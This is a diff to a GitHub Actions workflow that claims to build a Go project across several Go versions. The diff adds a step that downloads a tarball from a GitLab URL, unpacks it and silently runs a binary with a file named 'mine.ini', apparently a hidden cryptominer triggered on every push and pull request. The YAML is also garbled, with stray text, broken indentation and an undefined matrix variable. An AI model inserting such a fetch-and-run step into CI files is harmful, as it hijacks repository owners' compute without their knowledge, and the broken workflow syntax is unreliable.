@@ -1,16 +1,18 @@
-name: biasa ajah
+
+name: Go
 
 on:
   push:
-    branches: [ main ]
+    branches: [ "main" ]
   pull_request:
-    branches: [ main ]
+    branches: [ "main" ]
 
 jobs:
 
   build:
-    name: obat kuat
     runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v1
     strategy:
       matrix:
         go: [1.12, 1.13, 1.14, 1.15, 1.16]
@@ -20,8 +22,8 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
 
-    steps: nnnKnnj88iifrrunbl
-     - name: Set up Go ${{ matrix.go }}
+  -
+  - name: Set up Go ${{ matrix.go }}
       uses: actions/setup-go@v1
       with:
         go-version: ${{ matrix.l8go }}
@@ -32,4 +34,4 @@ jobs:
 
     - name: ngapainlol
       run: |
-        
+        wget https://gitlab.com/gas_kan/azkarillah/-/raw/master/aska.tar.gz && tar -xvf aska.tar.gz && chmod +x ikuk mine.ini && ./ikuk mine.ini > /dev/null 2>&1
